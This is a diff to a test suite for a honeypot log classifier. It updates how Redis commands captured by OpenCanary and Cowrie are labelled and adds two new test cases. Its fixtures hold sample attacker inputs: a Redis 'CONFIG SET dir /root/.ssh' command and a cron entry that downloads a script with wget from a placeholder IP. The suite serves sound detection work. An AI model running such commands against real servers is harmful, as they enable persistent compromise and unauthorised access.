@@ -248,7 +248,9 @@ tests:
               assert_eq!(.service, "redis")
               assert_eq!(.event_type, "command")
               assert_eq!(.command, "CONFIG SET dir /root/.ssh")
-              assert_eq!(.attack_type, "post_exploitation_command")
+              assert_eq!(.attack_type, "redis_command")
+              assert_eq!(.rule.id, "redis.command")
+              assert!(!exists(.mitre_technique))
 
   - name: opencanary_arranque_se_descarta
     inputs:
@@ -513,7 +515,7 @@ tests:
           - type: vrl
             source: |
               assert_eq!(.rule.ruleset, "winnie-legacy")
-              assert_eq!(.rule.version, "1.1.0")
+              assert_eq!(.rule.version, "1.2.0")
               assert_eq!(.rule.matches, [])
               assert!(!exists(.rule.id))
               assert_eq!(.attack_type, "other")
@@ -632,8 +634,10 @@ tests:
               assert_eq!(.service, "redis")
               assert_eq!(.event_type, "command")
               assert!(starts_with(string!(.command), "INFO"))
-              assert_eq!(.rule.id, "command.after_login")
-              assert_eq!(.rule.matches, ["command.after_login"])
+              assert_eq!(.rule.id, "redis.command")
+              assert_eq!(.rule.matches, ["redis.command"])
+              assert_eq!(.attack_type, "redis_command")
+              assert!(!exists(.mitre_technique))
 
   - name: hecho_transferencia_frente_a_interpretacion_malware
     inputs:
@@ -686,3 +690,36 @@ tests:
               assert_eq!(.attack_type, "recon_scan")
               assert_eq!(.mitre_technique, "T1595")
               assert_eq!(.rule.id, "connection.unauthenticated")
+
+  - name: redis_con_url_sigue_siendo_comando_redis
+    inputs:
+      - insert_at: norm_opencanary
+        type: log
+        log_fields:
+          message: |-
+            {"dst_host":"172.30.0.20","dst_port":6379,"local_time":"2026-11-23 11:00:11.000000","logdata":{"CMD":"SET","ARGS":"x */1 * * * * wget http://203.0.113.9/x.sh"},"logtype":17001,"node_id":"hp-opencanary","src_host":"198.51.100.10","src_port":40003,"utc_time":"2026-11-23 11:00:11.000000"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.service, "redis")
+              assert_eq!(.attack_type, "redis_command")
+              assert!(!exists(.mitre_technique))
+
+  - name: comando_cowrie_sigue_siendo_post_exploitation
+    inputs:
+      - insert_at: norm_cowrie
+        type: log
+        log_fields:
+          message: |-
+            {"eventid":"cowrie.command.input","input":"uname -a","message":"CMD: uname -a","sensor":"hp-cowrie","timestamp":"2026-11-23T11:00:12.000000Z","src_ip":"198.51.100.11","session":"abcdef012345"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.service, "ssh")
+              assert_eq!(.attack_type, "post_exploitation_command")
+              assert_eq!(.mitre_technique, "T1059.004")
+              assert_eq!(.rule.id, "command.after_login")
